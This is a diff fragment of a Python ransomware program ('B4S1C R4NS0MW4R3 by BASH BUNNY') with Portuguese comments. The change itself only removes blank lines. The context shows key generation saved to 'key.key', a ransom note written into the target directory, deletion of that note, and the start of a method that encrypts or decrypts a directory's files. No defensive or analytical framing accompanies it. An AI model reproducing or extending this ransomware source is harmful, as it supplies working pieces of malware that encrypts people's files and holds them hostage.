@@ -16,7 +16,6 @@ class CryptoKey:
         with open('key.key', 'wb') as key_file:
             key_file.write(key_value)
 
-    
     # Carregar a chave de criptografia gerada
     def loadKey():
         return open('key.key', 'rb').read()
@@ -30,12 +29,10 @@ class Ransomware:
             file.write("Your files have been encrypted by B4S1C R4NS0MW4R3 by BASH BUNNY\n")
             file.write(f"To decrypt your files, run 'python Ransomware.py -p \" {directory} \" --decrypt'")
 
-    
     # Deletar o arquivo de instruções
     def deleteTxt(directory):
         os.remove(directory + '/' + 'How to decrypt your files.txt')
 
-    
     # Criptografar/Descriptografar os arquivos
     def run(directory, key, action):
         # Deletar o txt caso esteja descriptografando
